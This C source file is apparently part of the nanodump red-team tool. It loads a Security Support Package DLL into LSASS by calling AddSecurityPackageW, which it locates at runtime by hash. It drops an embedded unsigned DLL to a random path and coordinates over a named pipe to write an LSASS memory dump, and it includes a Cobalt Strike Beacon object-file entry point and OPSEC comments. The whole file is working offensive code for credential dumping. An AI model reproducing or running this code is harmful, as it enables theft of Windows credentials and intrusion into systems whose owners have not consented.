#include "ssp/ssp.h"
#include "ssp/utils.h"

DWORD WINAPI load_ssp(LPVOID Parameter)
{
    LPSTR ssp_path = (LPSTR)Parameter;
    AddSecurityPackageW_t AddSecurityPackageW;
    wchar_t ssp_path_w[MAX_PATH];

    if (!is_full_path(ssp_path))
    {
        PRINT_ERR("You must provide a full path: %s", ssp_path);
        return 1;
    }
    // find the address of AddSecurityPackageW dynamically
    AddSecurityPackageW = (AddSecurityPackageW_t)(ULONG_PTR)get_function_address(
        get_library_address(SSPICLI_DLL, TRUE),
        AddSecurityPackageW_SW2_HASH,
        0);
    if (!AddSecurityPackageW)
    {
        api_not_found("AddSecurityPackageW");
        return 1;
    }

    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);

    //DPRINT("Loading %s into " LSASS, ssp_path);

    SECURITY_PACKAGE_OPTIONS spo = {0};
    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);

#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || PASS_PARAMS_VIA_NAMED_PIPES == 0
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
        return 0;
    }
    else
    {
        PRINT("Done, status: 0x%lx\n", status);
        return 1;
    }
#else
{
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        return 0;
    }
    else
    {
        return 1;
    }
}
#endif
}

#if defined(BOF)

#include "utils.c"
#include "../utils.c"
#include "../syscalls.c"
#include "../dinvoke.c"
#if PASS_PARAMS_VIA_NAMED_PIPES == 1
#include "../pipe.c"
#endif

void go(char* args, int length)
{
    datap  parser;
    LPSTR ssp_path;

    BeaconDataParse(&parser, args, length);
    ssp_path = BeaconDataExtract(&parser, NULL);

    // TODO: adapt
    load_ssp(ssp_path);
}

#endif

#if defined(EXE)

#ifdef _WIN64
 #include "nanodump_ssp_dll.x64.h"
#else
 #include "nanodump_ssp_dll.x86.h"
#endif

#if PASS_PARAMS_VIA_NAMED_PIPES == 1

void usage(char* procname)
{
    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", procname);
    PRINT("Dumpfile options:");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("SSP DLL options:");
    PRINT("    --write-dll, -wdll");
    PRINT("            path where to write the SSP DLL from nanodump (randomly generated if not defined)");
    PRINT("    --load-dll, -ldll");
    PRINT("            load an existing SSP DLL");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    BOOL           success          = FALSE;
    BOOL           dump_worked      = FALSE;
    LPSTR          dump_path        = NULL;
    BOOL           use_valid_sig    = FALSE;
    LPSTR          write_dll_path   = NULL;
    LPSTR          load_path        = NULL;
    BOOL           used_random_path = FALSE;
    HANDLE         hPipe            = NULL;
    HANDLE         hThread          = NULL;
    DWORD          dwThreadId       = 0;

    Sleep_t        Sleep        = NULL;
    CreateThread_t CreateThread = NULL;

    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Sleep_SW2_HASH,
        0);
    if (!Sleep)
    {
        api_not_found("Sleep");
        goto cleanup;
    }

    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateThread_SW2_HASH,
        0);
    if (!CreateThread)
    {
        api_not_found("CreateThread");
        goto cleanup;
    }

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return 0;
            }
            dump_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-wdll", 6) ||
                 !strncmp(argv[i], "--write-dll", 12))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write-dll value");
                return 0;
            }
            write_dll_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-ldll", 6) ||
                 !strncmp(argv[i], "--load-dll", 11))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --load value");
                return 0;
            }
            load_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (!dump_path)
    {
        PRINT("You need to provide the --write parameter");
        return 0;
    }

    if (!is_full_path(dump_path))
    {
        PRINT("You need to provide the full path: %s", dump_path);
        return 0;
    }

    if (load_path && write_dll_path)
    {
        PRINT("The options --write-dll and --load-dll cannot be used together");
        return 0;
    }

    // if the user did not specify a pre-existing DLL, write our own
    if (!load_path)
    {
        // fair OPSEC warning
        PRINT_ERR("[!] Writing an unsigned DLL to disk");

        if (!write_dll_path)
        {
            used_random_path = TRUE;

            success = generate_random_dll_path(&write_dll_path);
            if (!success)
                goto cleanup;

            DPRINT("generated random dll path: %s", write_dll_path);
        }

        success = write_ssp_dll(
            write_dll_path,
            nanodump_ssp_dll,
            nanodump_ssp_dll_len);
        if (!success)
            goto cleanup;
    }

    // load the SSP library in a thread because it will lock otherwise
    hThread = CreateThread(NULL, 0, load_ssp, write_dll_path ? write_dll_path : load_path, 0, &dwThreadId);

    for (int i = 0; i < 5; ++i)
    {
        // let's try to connect to the named pipe
        success = client_connect_to_named_pipe(
            IPC_PIPE_NAME,
            &hPipe);
        if (!success)
        {
            // sleep half a second and try again
            if (i != 4)
            {
                DPRINT("could not connnect to the named pipe, sleeping and trying again...");
            }
            Sleep(500);
            continue;
        }

        DPRINT("connnected to the named pipe");

        success = client_send_arguments_from_pipe(
            hPipe,
            dump_path,
            use_valid_sig,
            FALSE);
        if (!success)
            goto cleanup;

        success = client_recv_success(
            hPipe,
            &dump_worked);
        if (success && dump_worked)
        {
            print_success(
                dump_path,
                use_valid_sig,
                TRUE);
            goto cleanup;
        }
        else
            break;
    }

    PRINT_ERR("The dump was not created");

cleanup:
    if (hPipe)
        NtClose(hPipe);
    if (write_dll_path)
        delete_file(write_dll_path);
    if (used_random_path && write_dll_path)
        intFree(write_dll_path);
    if (hThread)
        NtClose(hThread);

    return 0;
}

#else // #if PASS_PARAMS_VIA_NAMED_PIPES == 1

void usage(char* procname)
{
    PRINT("usage: %s [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", procname);
    PRINT("SSP DLL options:");
    PRINT("    --write-dll, -wdll");
    PRINT("            path where to write the SSP DLL from nanodump (randomly generated if not defined)");
    PRINT("    --load-dll, -ldll");
    PRINT("            load an existing SSP DLL");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    BOOL           success          = FALSE;
    LPSTR          write_dll_path   = NULL;
    LPSTR          load_path        = NULL;
    BOOL           used_random_path = FALSE;

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-wdll", 6) ||
                 !strncmp(argv[i], "--write-dll", 12))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write-dll value");
                return 0;
            }
            write_dll_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-ldll", 6) ||
                 !strncmp(argv[i], "--load-dll", 11))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --load value");
                return 0;
            }
            load_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (load_path && write_dll_path)
    {
        PRINT("The options --write-dll and --load-dll cannot be used together");
        return 0;
    }

    // if the user did not specify a pre-existing DLL, write our own
    if (!load_path)
    {
        // fair OPSEC warning
        PRINT_ERR("[!] Writing an unsigned DLL to disk");

        if (!write_dll_path)
        {
            used_random_path = TRUE;

            success = generate_random_dll_path(&write_dll_path);
            if (!success)
                goto cleanup;

            DPRINT("generated random dll path: %s", write_dll_path);
        }

        success = write_ssp_dll(
            write_dll_path,
            nanodump_ssp_dll,
            nanodump_ssp_dll_len);
        if (!success)
            goto cleanup;
    }

    // load the SSP library
    load_ssp(write_dll_path ? write_dll_path : load_path);

cleanup:
    if (write_dll_path)
        delete_file(write_dll_path);
    if (used_random_path && write_dll_path)
        intFree(write_dll_path);

    return 0;
}

#endif // #if PASS_PARAMS_VIA_NAMED_PIPES == 1

#endif // defined(EXE)
